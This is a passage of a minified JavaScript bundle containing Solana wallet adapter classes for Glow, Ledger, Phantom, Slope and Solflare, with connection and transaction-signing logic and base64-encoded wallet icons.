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", this._readyState = "undefined" === typeof window || "undefined" === typeof document ? O.Unsupported : O.NotDetected, this._disconnected = () => {
                        const e = this._wallet;
                        e && (e.off("disconnect", this._disconnected), this._wallet = null, this._publicKey = null, this.emit("error", new U), this.emit("disconnect"))
                    }, this._connecting = !1, this._wallet = null, this._publicKey = null, this._network = null !== (t = e.network) && void 0 !== t ? t : null, this._readyState !== O.Unsupported) {
                    const e = t => {
                        "object" === typeof t.data && t.data.__glow_loaded && (this._readyState !== O.Installed && (this._readyState = O.Installed, this.emit("readyStateChange", this._readyState)), window.removeEventListener("message", e))
                    };
                    window.addEventListener("message", e), J((() => {
                        var t;
                        return !!(null === (t = window.glowSolana) || void 0 === t ? void 0 : t.isGlow) && (window.removeEventListener("message", e), this._readyState !== O.Installed && (this._readyState = O.Installed, this.emit("readyStateChange", this._readyState)), !0)
                    }))
                }
            }
            get publicKey() {
                return this._publicKey
            }
            get connecting() {
                return this._connecting
            }
            get connected() {
                var e;
                return !!(null === (e = this._wallet) || void 0 === e ? void 0 : e.isConnected)
            }
            get readyState() {
                return this._readyState
            }
            async connect() {
                try {
                    if (this.connected || this.connecting) return;
                    if (this._readyState !== O.Installed) throw new N;
                    this._connecting = !0;
                    const t = window.glowSolana;
                    try {
                        await t.connect()
                    } catch (e) {
                        throw new z(null === e || void 0 === e ? void 0 : e.message, e)
                    }
                    if (!t.publicKey) throw new F;
                    let n;
                    try {
                        n = new _.PublicKey(t.publicKey.toBytes())
                    } catch (e) {
                        throw new H(null === e || void 0 === e ? void 0 : e.message, e)
                    }
                    t.on("disconnect", this._disconnected), this._wallet = t, this._publicKey = n, this.emit("connect", n)
                } catch (e) {
                    throw this.emit("error", e), e
                } finally {
                    this._connecting = !1
                }
            }
            async disconnect() {
                const e = this._wallet;
                if (e) {
                    e.off("disconnect", this._disconnected), this._wallet = null, this._publicKey = null;
                    try {
                        await e.disconnect()
                    } catch (t) {
                        this.emit("error", new j(null === t || void 0 === t ? void 0 : t.message, t))
                    }
                }
                this.emit("disconnect")
            }
            async sendTransaction(e, t) {
                let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                try {
                    const i = this._wallet;
                    if (!i) throw new W;
                    try {
                        e = await this.prepareTransaction(e, t);
                        const {
                            signers: r,
                            ...o
                        } = n;
                        (null === r || void 0 === r ? void 0 : r.length) && e.partialSign(...r), o.preflightCommitment = o.preflightCommitment || t.commitment;
                        const {
                            signature: s
                        } = await i.signAndSendTransaction(e, { ...o,
                            network: this._network
                        });
                        return s
                    } catch (r) {
                        if (r instanceof L) throw r;
                        throw new K(null === r || void 0 === r ? void 0 : r.message, r)
                    }
                } catch (r) {
                    throw this.emit("error", r), r
                }
            }
            async signTransaction(e) {
                try {
                    const n = this._wallet;
                    if (!n) throw new W;
                    try {
                        return await n.signTransaction(e, this._network) || e
                    } catch (t) {
                        throw new V(null === t || void 0 === t ? void 0 : t.message, t)
                    }
                } catch (t) {
                    throw this.emit("error", t), t
                }
            }
            async signAllTransactions(e) {
                try {
                    const n = this._wallet;
                    if (!n) throw new W;
                    try {
                        return await n.signAllTransactions(e, this._network) || e
                    } catch (t) {
                        throw new V(null === t || void 0 === t ? void 0 : t.message, t)
                    }
                } catch (t) {
                    throw this.emit("error", t), t
                }
            }
            async signMessage(e) {
                try {
                    const n = this._wallet;
                    if (!n) throw new W;
                    try {
                        const {
                            signature: t
                        } = await n.signMessage(e);
                        return t
                    } catch (t) {
                        throw new q(null === t || void 0 === t ? void 0 : t.message, t)
                    }
                } catch (t) {
                    throw this.emit("error", t), t
                }
            }
        }
        "undefined" !== typeof window && void 0 === window.Buffer && (window.Buffer = ge.Buffer);
        var au = __webpack_require__(670);

        function uu(e) {
            return (2147483648 | e) >>> 0
        }
        const cu = 255;
        async function lu(e, t, n) {
            const r = Buffer.alloc(1);
            r.writeUInt8(1, 0);
            const i = t.serializeMessage(),
                o = Buffer.concat([r, n, i]);
            return await fu(e, 6, 1, o)
        }
        async function fu(e, t, n, r) {
            let i = 0,
                o = 0;
            if (r.length > cu)
                for (; r.length - o > cu;) {
                    const s = r.slice(o, o + cu);
                    if (2 !== (await e.send(224, t, n, 2 | i, s)).length) throw new au.rZ(au.WC.INCORRECT_DATA);
                    i |= 1, o += cu
                }
            const s = r.slice(o),
                a = await e.send(224, t, n, i, s);
            return a.slice(0, a.length - 2)
        }
        class hu extends iu {
            constructor() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                super(), this.name = "Ledger", this.url = "https://ledger.com", this.icon = "data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMzUgMzUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGcgZmlsbD0iI2ZmZiI+PHBhdGggZD0ibTIzLjU4OCAwaC0xNnYyMS41ODNoMjEuNnYtMTZhNS41ODUgNS41ODUgMCAwIDAgLTUuNi01LjU4M3oiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDUuNzM5KSIvPjxwYXRoIGQ9Im04LjM0MiAwaC0yLjc1N2E1LjU4NSA1LjU4NSAwIDAgMCAtNS41ODUgNS41ODV2Mi43NTdoOC4zNDJ6Ii8+PHBhdGggZD0ibTAgNy41OWg4LjM0MnY4LjM0MmgtOC4zNDJ6IiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgwIDUuNzM5KSIvPjxwYXRoIGQ9Im0xNS4xOCAyMy40NTFoMi43NTdhNS41ODUgNS41ODUgMCAwIDAgNS41ODUtNS42di0yLjY3MWgtOC4zNDJ6IiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxMS40NzggMTEuNDc4KSIvPjxwYXRoIGQ9Im03LjU5IDE1LjE4aDguMzQydjguMzQyaC04LjM0MnoiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDUuNzM5IDExLjQ3OCkiLz48cGF0aCBkPSJtMCAxNS4xOHYyLjc1N2E1LjU4NSA1LjU4NSAwIDAgMCA1LjU4NSA1LjU4NWgyLjc1N3YtOC4zNDJ6IiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgwIDExLjQ3OCkiLz48L2c+PC9zdmc+", this._readyState = "undefined" !== typeof window && "undefined" !== typeof document && "undefined" !== typeof navigator && navigator.hid ? O.Loadable : O.Unsupported, this._disconnected = () => {
                    const e = this._transport;
                    e && (e.off("disconnect", this._disconnected), this._transport = null, this._publicKey = null, this.emit("error", new U), this.emit("disconnect"))
                }, this._derivationPath = e.derivationPath || function(e, t) {
                    const n = void 0 !== e ? void 0 === t ? 3 : 4 : 2,
                        r = Buffer.alloc(1 + 4 * n);
                    let i = r.writeUInt8(n, 0);
                    return i = r.writeUInt32BE(uu(44), i), i = r.writeUInt32BE(uu(501), i), void 0 !== e && (i = r.writeUInt32BE(uu(e), i), void 0 !== t && r.writeUInt32BE(uu(t), i)), r
                }(0, 0), this._connecting = !1, this._transport = null, this._publicKey = null
            }
            get publicKey() {
                return this._publicKey
            }
            get connecting() {
                return this._connecting
            }
            get readyState() {
                return this._readyState
            }
            async connect() {
                try {
                    if (this.connected || this.connecting) return;
                    if (this._readyState !== O.Loadable) throw new N;
                    let t, n, r;
                    this._connecting = !0;
                    try {
                        ({
                            default: t
                        } = await __webpack_require__.e(126).then(__webpack_require__.bind(__webpack_require__, 4126)))
                    } catch (e) {
                        throw new R(null === e || void 0 === e ? void 0 : e.message, e)
                    }
                    try {
                        n = await t.create()
                    } catch (e) {
                        throw new z(null === e || void 0 === e ? void 0 : e.message, e)
                    }
                    try {
                        r = await async function(e, t) {
                            const n = await fu(e, 5, 0, t);
                            return new _.PublicKey(n)
                        }(n, this._derivationPath)
                    } catch (e) {
                        throw new H(null === e || void 0 === e ? void 0 : e.message, e)
                    }
                    n.on("disconnect", this._disconnected), this._transport = n, this._publicKey = r, this.emit("connect", r)
                } catch (e) {
                    throw this.emit("error", e), e
                } finally {
                    this._connecting = !1
                }
            }
            async disconnect() {
                const e = this._transport;
                if (e) {
                    e.off("disconnect", this._disconnected), this._transport = null, this._publicKey = null;
                    try {
                        await e.close()
                    } catch (t) {
                        this.emit("error", new j(null === t || void 0 === t ? void 0 : t.message, t))
                    }
                }
                this.emit("disconnect")
            }
            async signTransaction(e) {
                try {
                    const n = this._transport,
                        r = this._publicKey;
                    if (!n || !r) throw new W;
                    try {
                        const t = await lu(n, e, this._derivationPath);
                        e.addSignature(r, t)
                    } catch (t) {
                        throw new V(null === t || void 0 === t ? void 0 : t.message, t)
                    }
                    return e
                } catch (t) {
                    throw this.emit("error", t), t
                }
            }
            async signAllTransactions(e) {
                try {
                    const n = this._transport,
                        r = this._publicKey;
                    if (!n || !r) throw new W;
                    try {
                        const t = this._derivationPath;
                        for (const i of e) {
                            const e = await lu(n, i, t);
                            i.addSignature(r, e)
                        }
                    } catch (t) {
                        throw new V(null === t || void 0 === t ? void 0 : t.message, t)
                    }
                    return e
                } catch (t) {
                    throw this.emit("error", t), t
                }
            }
        }
        class du extends ou {
            constructor() {
                super(), this.name = "Phantom", this.url = "https://phantom.app", this.icon = "data:image/svg+xml;base64,PHN2ZyBmaWxsPSJub25lIiBoZWlnaHQ9IjM0IiB3aWR0aD0iMzQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGxpbmVhckdyYWRpZW50IGlkPSJhIiB4MT0iLjUiIHgyPSIuNSIgeTE9IjAiIHkyPSIxIj48c3RvcCBvZmZzZXQ9IjAiIHN0b3AtY29sb3I9IiM1MzRiYjEiLz48c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiM1NTFiZjkiLz48L2xpbmVhckdyYWRpZW50PjxsaW5lYXJHcmFkaWVudCBpZD0iYiIgeDE9Ii41IiB4Mj0iLjUiIHkxPSIwIiB5Mj0iMSI+PHN0b3Agb2Zmc2V0PSIwIiBzdG9wLWNvbG9yPSIjZmZmIi8+PHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSIjZmZmIiBzdG9wLW9wYWNpdHk9Ii44MiIvPjwvbGluZWFyR3JhZGllbnQ+PGNpcmNsZSBjeD0iMTciIGN5PSIxNyIgZmlsbD0idXJsKCNhKSIgcj0iMTciLz48cGF0aCBkPSJtMjkuMTcwMiAxNy4yMDcxaC0yLjk5NjljMC02LjEwNzQtNC45NjgzLTExLjA1ODE3LTExLjA5NzUtMTEuMDU4MTctNi4wNTMyNSAwLTEwLjk3NDYzIDQuODI5NTctMTEuMDk1MDggMTAuODMyMzctLjEyNDYxIDYuMjA1IDUuNzE3NTIgMTEuNTkzMiAxMS45NDUzOCAxMS41OTMyaC43ODM0YzUuNDkwNiAwIDEyLjg0OTctNC4yODI5IDEzLjk5OTUtOS41MDEzLjIxMjMtLjk2MTktLjU1MDItMS44NjYxLTEuNTM4OC0xLjg2NjF6bS0xOC41NDc5LjI3MjFjMCAuODE2Ny0uNjcwMzggMS40ODQ3LTEuNDkwMDEgMS40ODQ3LS44MTk2NCAwLTEuNDg5OTgtLjY2ODMtMS40ODk5OC0xLjQ4NDd2LTIuNDAxOWMwLS44MTY3LjY3MDM0LTEuNDg0NyAxLjQ4OTk4LTEuNDg0Ny44MTk2MyAwIDEuNDkwMDEuNjY4IDEuNDkwMDEgMS40ODQ3em01LjE3MzggMGMwIC44MTY3LS42NzAzIDEuNDg0Ny0xLjQ4OTkgMS40ODQ3LS44MTk3IDAtMS40OS0uNjY4My0xLjQ5LTEuNDg0N3YtMi40MDE5YzAtLjgxNjcuNjcwNi0xLjQ4NDcgMS40OS0xLjQ4NDcuODE5NiAwIDEuNDg5OS42NjggMS40ODk5IDEuNDg0N3oiIGZpbGw9InVybCgjYikiLz48L3N2Zz4K", this._readyState = "undefined" === typeof window || "undefined" === typeof document ? O.Unsupported : O.NotDetected, this._disconnected = () => {
                    const e = this._wallet;
                    e && (e.off("disconnect", this._disconnected), this._wallet = null, this._publicKey = null, this.emit("error", new U), this.emit("disconnect"))
                }, this._connecting = !1, this._wallet = null, this._publicKey = null, this._readyState !== O.Unsupported && J((() => {
                    var e, t, n;
                    return !(!(null === (t = null === (e = window.phantom) || void 0 === e ? void 0 : e.solana) || void 0 === t ? void 0 : t.isPhantom) && !(null === (n = window.solana) || void 0 === n ? void 0 : n.isPhantom)) && (this._readyState = O.Installed, this.emit("readyStateChange", this._readyState), !0)
                }))
            }
            get publicKey() {
                return this._publicKey
            }
            get connecting() {
                return this._connecting
            }
            get connected() {
                var e;
                return !!(null === (e = this._wallet) || void 0 === e ? void 0 : e.isConnected)
            }
            get readyState() {
                return this._readyState
            }
            async connect() {
                var e;
                try {
                    if (this.connected || this.connecting) return;
                    if (this._readyState !== O.Installed) throw new N;
                    this._connecting = !0;
                    const n = (null === (e = window.phantom) || void 0 === e ? void 0 : e.solana) || window.solana;
                    if (!n.isConnected) try {
                        return await n.connect()
                    } catch (t) {
                        throw new z(null === t || void 0 === t ? void 0 : t.message, t)
                    }
                    if (!n.publicKey) throw new F;
                    let r;
                    try {
                        r = new _.PublicKey(n.publicKey.toBytes())
                    } catch (t) {
                        throw new H(null === t || void 0 === t ? void 0 : t.message, t)
                    }
                    n.on("disconnect", this._disconnected), this._wallet = n, this._publicKey = r, this.emit("connect", r)
                } catch (t) {
                    throw this.emit("error", t), t
                } finally {
                    this._connecting = !1
                }
            }
            async disconnect() {
                const e = this._wallet;
                if (e) {
                    e.off("disconnect", this._disconnected), this._wallet = null, this._publicKey = null;
                    try {
                        await e.disconnect()
                    } catch (t) {
                        this.emit("error", new j(null === t || void 0 === t ? void 0 : t.message, t))
                    }
                }
                this.emit("disconnect")
            }
            async sendTransaction(e, t) {
                let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                try {
                    const i = this._wallet;
                    if (!i) throw new W;
                    try {
                        e = await this.prepareTransaction(e, t);
                        const {
                            signers: r,
                            ...o
                        } = n;
                        (null === r || void 0 === r ? void 0 : r.length) && e.partialSign(...r), o.preflightCommitment = o.preflightCommitment || t.commitment;
                        const {
                            signature: s
                        } = await i.signAndSendTransaction(e, o);
                        return s
                    } catch (r) {
                        if (r instanceof L) throw r;
                        throw new K(null === r || void 0 === r ? void 0 : r.message, r)
                    }
                } catch (r) {
                    throw this.emit("error", r), r
                }
            }
            async signTransaction(e) {
                try {
                    const n = this._wallet;
                    if (!n) throw new W;
                    try {
                        return await n.signTransaction(e) || e
                    } catch (t) {
                        throw new V(null === t || void 0 === t ? void 0 : t.message, t)
                    }
                } catch (t) {
                    throw this.emit("error", t), t
                }
            }
            async signAllTransactions(e) {
                try {
                    const n = this._wallet;
                    if (!n) throw new W;
                    try {
                        return await n.signAllTransactions(e) || e
                    } catch (t) {
                        throw new V(null === t || void 0 === t ? void 0 : t.message, t)
                    }
                } catch (t) {
                    throw this.emit("error", t), t
                }
            }
            async signMessage(e) {
                try {
                    const n = this._wallet;
                    if (!n) throw new W;
                    try {
                        const {
                            signature: t
                        } = await n.signMessage(e);
                        return t
                    } catch (t) {
                        throw new q(null === t || void 0 === t ? void 0 : t.message, t)
                    }
                } catch (t) {
                    throw this.emit("error", t), t
                }
            }
        }
        class pu extends ou {
            constructor() {
                super(), this.name = "Slope", this.url = "https://slope.finance", this.icon = "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTI4IiBoZWlnaHQ9IjEyOCIgdmlld0JveD0iMCAwIDEyOCAxMjgiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIxMjgiIGhlaWdodD0iMTI4IiByeD0iNjQiIGZpbGw9IiM2RTY2RkEiLz4KPHBhdGggZD0iTTI3Ljk0NzUgNTIuMTU5Nkw1MS45ODI2IDI4LjA1NzJMNzIuNjA5OCA3LjY1Mzg5QzczLjg3MzQgNi40MDQwMSA3Ni4wMTc4IDcuMjk5MSA3Ni4wMTc4IDkuMDc2NDJMNzYuMDE4NyA1Mi4xNTlMNTEuOTgzNiA3Ni4xMjY4TDI3Ljk0NzUgNTIuMTU5NloiIGZpbGw9InVybCgjcGFpbnQwX2xpbmVhcl8zNzk1XzI1NTQzKSIvPgo8cGF0aCBkPSJNMTAwLjA1MyA3NS45OTNMNzYuMDE4IDUxLjk1OEw1MS45ODI5IDc1Ljk5MzFMNTEuOTgyOSAxMTguOTI0QzUxLjk4MjkgMTIwLjcwMyA1NC4xMzEyIDEyMS41OTcgNTUuMzkzNyAxMjAuMzQzTDEwMC4wNTMgNzUuOTkzWiIgZmlsbD0idXJsKCNwYWludDFfbGluZWFyXzM3OTVfMjU1NDMpIi8+CjxwYXRoIGQ9Ik0yNy45NDcgNTIuMTYwMUg0NC42ODM5QzQ4LjcxNDcgNTIuMTYwMSA1MS45ODIyIDU1LjQyNzYgNTEuOTgyMiA1OS40NTgzVjc2LjEyNjlIMzUuMjQ1M0MzMS4yMTQ2IDc2LjEyNjkgMjcuOTQ3IDcyLjg1OTQgMjcuOTQ3IDY4LjgyODdWNTIuMTYwMVoiIGZpbGw9IiNGMUYwRkYiLz4KPHBhdGggZD0iTTc2LjAxNzggNTIuMTYwMUg5Mi43NTQ3Qzk2Ljc4NTUgNTIuMTYwMSAxMDAuMDUzIDU1LjQyNzYgMTAwLjA1MyA1OS40NTgzVjc2LjEyNjlIODMuMzE2MUM3OS4yODU0IDc2LjEyNjkgNzYuMDE3OCA3Mi44NTk0IDc2LjAxNzggNjguODI4N1Y1Mi4xNjAxWiIgZmlsbD0iI0YxRjBGRiIvPgo8ZGVmcz4KPGxpbmVhckdyYWRpZW50IGlkPSJwYWludDBfbGluZWFyXzM3OTVfMjU1NDMiIHgxPSI1MS45ODMxIiB5MT0iNy4wNzE1NSIgeDI9IjUxLjk4MzEiIHkyPSI3Ni4xMjY4IiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CjxzdG9wIHN0b3AtY29sb3I9IiNBOEFERkYiLz4KPHN0b3Agb2Zmc2V0PSIwLjY0ODU1NiIgc3RvcC1jb2xvcj0id2hpdGUiLz4KPC9saW5lYXJHcmFkaWVudD4KPGxpbmVhckdyYWRpZW50IGlkPSJwYWludDFfbGluZWFyXzM3OTVfMjU1NDMiIHgxPSI3Ni4wMTgiIHkxPSI1MS45NTgiIHgyPSI3Ni4wMTgiIHkyPSIxMjAuOTI4IiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CjxzdG9wIG9mZnNldD0iMC4yNjA3ODQiIHN0b3AtY29sb3I9IiNCNkJBRkYiLz4KPHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSIjRTRFMkZGIi8+CjwvbGluZWFyR3JhZGllbnQ+CjwvZGVmcz4KPC9zdmc+Cg==", this._readyState = "undefined" === typeof window || "undefined" === typeof document ? O.Unsupported : O.NotDetected, this._connecting = !1, this._wallet = null, this._publicKey = null, this._readyState !== O.Unsupported && J((() => !("function" !== typeof window.Slope && !window.slopeApp) && (this._readyState = O.Installed, this.emit("readyStateChange", this._readyState), !0)))
            }
            get publicKey() {
                return this._publicKey
            }
            get connecting() {
                return this._connecting
            }
            get readyState() {
                return this._readyState
            }
            async connect() {
                try {
                    if (this.connected || this.connecting) return;
                    if (this._readyState !== O.Installed || "function" !== typeof window.Slope) throw new N;
                    this._connecting = !0;
                    const t = new window.Slope;
                    let n, r;
                    try {
                        ({
                            data: n
                        } = await t.connect())
                    } catch (e) {
                        throw new z(null === e || void 0 === e ? void 0 : e.message, e)
                    }
                    if (!n.publicKey) throw new F;
                    try {
                        r = new _.PublicKey(n.publicKey)
                    } catch (e) {
                        throw new H(null === e || void 0 === e ? void 0 : e.message, e)
                    }
                    this._wallet = t, this._publicKey = r, this.emit("connect", r)
                } catch (e) {
                    throw this.emit("error", e), e
                } finally {
                    this._connecting = !1
                }
            }
            async disconnect() {
                const e = this._wallet;
                if (e) {
                    this._wallet = null, this._publicKey = null;
                    try {
                        let n;
                        try {
                            ({
                                msg: n
                            } = await e.disconnect())
                        } catch (t) {
                            throw new j(null === t || void 0 === t ? void 0 : t.message, t)
                        }
                        if ("ok" !== n) throw new j(n)
                    } catch (t) {
                        this.emit("error", t)
                    }
                }
                this.emit("disconnect")
            }
            async signTransaction(e) {
                try {
                    const n = this._wallet;
                    if (!n) throw new W;
                    try {
                        const t = be.encode(e.serializeMessage()),
                            {
                                msg: r,
                                data: i
                            } = await n.signTransaction(t);
                        if (!i.publicKey || !i.signature) throw new V(r);
                        const o = new _.PublicKey(i.publicKey),
                            s = be.decode(i.signature);
                        return e.addSignature(o, s), e
                    } catch (t) {
                        if (t instanceof L) throw t;
                        throw new V(null === t || void 0 === t ? void 0 : t.message, t)
                    }
                } catch (t) {
                    throw this.emit("error", t), t
                }
            }
            async signAllTransactions(e) {
                var t;
                try {
                    const r = this._wallet;
                    if (!r) throw new W;
                    try {
                        const n = e.map((e => be.encode(e.serializeMessage()))),
                            {
                                msg: i,
                                data: o
                            } = await r.signAllTransactions(n),
                            s = e.length;
                        if (!o.publicKey || (null === (t = o.signatures) || void 0 === t ? void 0 : t.length) !== s) throw new V(i);
                        const a = new _.PublicKey(o.publicKey);
                        for (let t = 0; t < s; t++) e[t].addSignature(a, be.decode(o.signatures[t]));
                        return e
                    } catch (n) {
                        if (n instanceof L) throw n;
                        throw new V(null === n || void 0 === n ? void 0 : n.message, n)
                    }
                } catch (n) {
                    throw this.emit("error", n), n
                }
            }
            async signMessage(e) {
                try {
                    const n = this._wallet;
                    if (!n) throw new W;
                    try {
                        const t = await n.signMessage(e);
                        return be.decode(t.data.signature)
                    } catch (t) {
                        throw new q(null === t || void 0 === t ? void 0 : t.message, t)
                    }
                } catch (t) {
                    throw this.emit("error", t), t
                }
            }
        }
        class yu extends ou {
            constructor() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                super(), this.name = "Solflare", this.url = "https://solflare.com", this.icon = "data:image/svg+xml;base64,PHN2ZyBmaWxsPSJub25lIiBoZWlnaHQ9IjUwIiB2aWV3Qm94PSIwIDAgNTAgNTAiIHdpZHRoPSI1MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+PGxpbmVhckdyYWRpZW50IGlkPSJhIj48c3RvcCBvZmZzZXQ9IjAiIHN0b3AtY29sb3I9IiNmZmMxMGIiLz48c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNmYjNmMmUiLz48L2xpbmVhckdyYWRpZW50PjxsaW5lYXJHcmFkaWVudCBpZD0iYiIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIHgxPSI2LjQ3ODM1IiB4Mj0iMzQuOTEwNyIgeGxpbms6aHJlZj0iI2EiIHkxPSI3LjkyIiB5Mj0iMzMuNjU5MyIvPjxyYWRpYWxHcmFkaWVudCBpZD0iYyIgY3g9IjAiIGN5PSIwIiBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KDQuOTkyMTg4MzIgMTIuMDYzODc5NjMgLTEyLjE4MTEzNjU1IDUuMDQwNzEwNzQgMjIuNTIwMiAyMC42MTgzKSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIHI9IjEiIHhsaW5rOmhyZWY9IiNhIi8+PHBhdGggZD0ibTI1LjE3MDggNDcuOTEwNGMuNTI1IDAgLjk1MDcuNDIxLjk1MDcuOTQwM3MtLjQyNTcuOTQwMi0uOTUwNy45NDAyLS45NTA3LS40MjA5LS45NTA3LS45NDAyLjQyNTctLjk0MDMuOTUwNy0uOTQwM3ptLTEuMDMyOC00NC45MTU2NWMuNDY0Ni4wMzgzNi44Mzk4LjM5MDQuOTAyNy44NDY4MWwxLjEzMDcgOC4yMTU3NGMuMzc5OCAyLjcxNDMgMy42NTM1IDMuODkwNCA1LjY3NDMgMi4wNDU5bDExLjMyOTEtMTAuMzExNThjLjI3MzMtLjI0ODczLjY5ODktLjIzMTQ5Ljk1MDcuMDM4NTEuMjMwOS4yNDc3Mi4yMzc5LjYyNjk3LjAxNjEuODgyNzdsLTkuODc5MSAxMS4zOTU4Yy0xLjgxODcgMi4wOTQyLS40NzY4IDUuMzY0MyAyLjI5NTYgNS41OTc4bDguNzE2OC44NDAzYy40MzQxLjA0MTguNzUxNy40MjM0LjcwOTMuODUyNC0uMDM0OS4zNTM3LS4zMDc0LjYzOTUtLjY2MjguNjk0OWwtOS4xNTk0IDEuNDMwMmMtMi42NTkzLjM2MjUtMy44NjM2IDMuNTExNy0yLjEzMzkgNS41NTc2bDMuMjIgMy43OTYxYy4yNTk0LjMwNTguMjE4OC43NjE1LS4wOTA4IDEuMDE3OC0uMjYyMi4yMTcyLS42NDE5LjIyNTYtLjkxMzguMDIwM2wtMy45Njk0LTIuOTk3OGMtMi4xNDIxLTEuNjEwOS01LjIyOTctLjI0MTctNS40NTYxIDIuNDI0M2wtLjg3NDcgMTAuMzk3NmMtLjAzNjIuNDI5NS0uNDE3OC43NDg3LS44NTI1LjcxMy0uMzY5LS4wMzAzLS42NjcxLS4zMDk3LS43MTcxLS42NzIxbC0xLjM4NzEtMTAuMDQzN2MtLjM3MTctMi43MTQ0LTMuNjQ1NC0zLjg5MDQtNS42NzQzLTIuMDQ1OWwtMTIuMDUxOTUgMTAuOTc0Yy0uMjQ5NDcuMjI3MS0uNjM4MDkuMjExNC0uODY4LS4wMzUtLjIxMDk0LS4yMjYyLS4yMTczNS0uNTcyNC0uMDE0OTMtLjgwNmwxMC41MTgxOC0xMi4xMzg1YzEuODE4Ny0yLjA5NDIuNDg0OS01LjM2NDQtMi4yODc2LTUuNTk3OGwtOC43MTg3Mi0uODQwNWMtLjQzNDEzLS4wNDE4LS43NTE3Mi0uNDIzNS0uNzA5MzYtLjg1MjQuMDM0OTMtLjM1MzcuMzA3MzktLjYzOTQuNjYy